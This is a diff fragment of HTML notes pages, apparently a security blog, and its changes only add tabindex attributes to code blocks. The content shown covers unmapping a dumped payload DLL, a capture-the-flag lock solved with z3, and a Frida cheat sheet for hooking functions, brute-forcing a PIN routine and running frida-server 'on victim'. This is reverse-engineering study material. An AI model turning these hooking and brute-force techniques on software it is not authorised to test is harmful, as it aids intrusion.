 &lt;p&gt;&lt;a href=&#34;https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper&#34;&gt;Github&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pe_unmapper.exe &amp;lt;in_file&amp;gt;      &amp;lt;base&amp;gt;  &amp;lt;opt: out&amp;gt;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pe_unmapper.exe &amp;lt;in_file&amp;gt;      &amp;lt;base&amp;gt;  &amp;lt;opt: out&amp;gt;&lt;/span&gt;
 &amp;gt; pe_unmapper.exe _02660000.mem 02660000 payload.dll
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;manual&#34;&gt;Manual&lt;/h4&gt;
 &lt;ol&gt;
@@ -1003,7 +1003,7 @@ wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
 &lt;p&gt;&lt;img src=&#34;/img/.247ctf-the-secret-lock.assets/secret-lock.png&#34; alt=&#34;Lock&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
 &lt;p&gt;By looking into the code we can quickly identify the code section, because it is written in plain-text in the single &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; block. Below you can see the main unlocking logic:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onChange&lt;/span&gt;() {
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onChange&lt;/span&gt;() {
     &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCode&lt;/span&gt;();
     &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;checkFlag&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;);
     &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;textContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;;
@@ -1037,7 +1037,7 @@ wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
 &lt;li&gt;If all checks are passed, then each value is treated as ascii character and it&amp;rsquo;s passed to &lt;em&gt;result&lt;/em&gt; value.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Like I mentioned before - we have big block of conditions which needs to be met, you can find short snippet below (I used visual-code to quickly get rid of &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; operators and put each expression in new line).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) 
 ((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;) 
 ((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2332&lt;/span&gt;) 
 ((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;) 
@@ -1052,7 +1052,7 @@ wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
 ((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2759&lt;/span&gt;) 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can notice a lot of expressions -&amp;gt; &lt;del&gt;we can&amp;rsquo;t&lt;/del&gt; don&amp;rsquo;t want to solve it manually - we need to write a script.&lt;/p&gt;
 &lt;p&gt;Expressions are utilizing different operations, so we can&amp;rsquo;t simply parse them in python, it is better to use some specialized tool like &lt;a href=&#34;https://github.com/Z3Prover/z3&#34;&gt;z3-solver&lt;/a&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# We are creating the bit represenation of int32, 40 = len(FLAG)&lt;/span&gt;
@@ -1137,7 +1137,7 @@ z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span styl
 &lt;/blockquote&gt;
 &lt;h2 id=&#34;quick-start&#34;&gt;Quick Start&lt;/h2&gt;
 &lt;p&gt;Frida project quick start:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone https://github.com/trib0r3/frida-scripts
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone https://github.com/trib0r3/frida-scripts
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;default-stuff&#34;&gt;Default stuff&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;remote port: &lt;code&gt;27042&lt;/code&gt;&lt;/li&gt;
@@ -1149,16 +1149,16 @@ z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span styl
 &lt;/ul&gt;
 &lt;h2 id=&#34;useful-api-calls&#34;&gt;Useful API calls&lt;/h2&gt;
 &lt;h3 id=&#34;debugging&#34;&gt;Debugging&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// print local environment (variables)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// print local environment (variables)
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;enumerate-binary&#34;&gt;Enumerate binary&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// list loaded libraries
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// list loaded libraries
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;enumerateModulesSync&lt;/span&gt;();
 
 &lt;span style=&#34;color:#75715e&#34;&gt;// list functions of the library
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getModuleByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.30.so&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;enumerateExports&lt;/span&gt;();
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resolving-libsfuncs-location&#34;&gt;Resolving libs/funcs location&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get reference to library
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get reference to library
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getModuleByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.30.so&amp;#34;&lt;/span&gt;);
 
 &lt;span style=&#34;color:#75715e&#34;&gt;// Retrieve from symbols
@@ -1193,7 +1193,7 @@ z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span styl
 &lt;/ol&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
 &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NativeFunction&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;int&amp;#34;&lt;/span&gt;, [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pointer&amp;#34;&lt;/span&gt;]);
 
 &lt;span style=&#34;color:#a6e22e&#34;&gt;rpc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#75715e&#34;&gt;// defince accessible funcs from python
@@ -1202,7 +1202,7 @@ z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span styl
         &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPin&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pin&lt;/span&gt;);
     }
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index.js&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
@@ -1223,7 +1223,7 @@ api &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; script&lt;span styl
     &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reuse-the-binary-code&#34;&gt;Reuse the binary code&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get addr
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get addr
 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
 
 &lt;span style=&#34;color:#75715e&#34;&gt;// create JS wrapper
@@ -1242,7 +1242,7 @@ api &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; script&lt;span styl
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;function-hooking&#34;&gt;Function Hooking&lt;/h2&gt;
 &lt;h3 id=&#34;by-symbol&#34;&gt;By symbol&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; __future__ &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; print_function
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; __future__ &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; print_function
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; frida
 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
 
@@ -1260,7 +1260,7 @@ script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;on(&lt;span style=
 script&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load()
 sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;by-symbol-1&#34;&gt;By symbol&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rand_range&amp;#34;&lt;/span&gt;);
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rand_range&amp;#34;&lt;/span&gt;);
 
 &lt;span style=&#34;color:#a6e22e&#34;&gt;Interceptor&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;attach&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;rand_range&lt;/span&gt;, {
     &lt;span style=&#34;color:#a6e22e&#34;&gt;onEnter&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;) {
@@ -1289,7 +1289,7 @@ sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin&lt;span style=&
 &lt;h3 id=&#34;frida-cli&#34;&gt;frida CLI&lt;/h3&gt;
 &lt;p&gt;Open binary with &lt;code&gt;frida &amp;lt;exec&amp;gt;&lt;/code&gt; command and play with it in interactive shell session.&lt;/p&gt;
 &lt;h3 id=&#34;frida-server-remote&#34;&gt;frida-server (remote)&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# on victim&lt;/span&gt;
 frida-server -l 0.0.0.0:1337
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# on local client&lt;/span&gt;
@@ -1301,20 +1301,20 @@ frida -H $IP:$PORT $proc_name
 &lt;li&gt;load with LD_PRELOAD&lt;/li&gt;
 &lt;li&gt;load with patchelf&lt;/li&gt;
 &lt;/ul&gt;
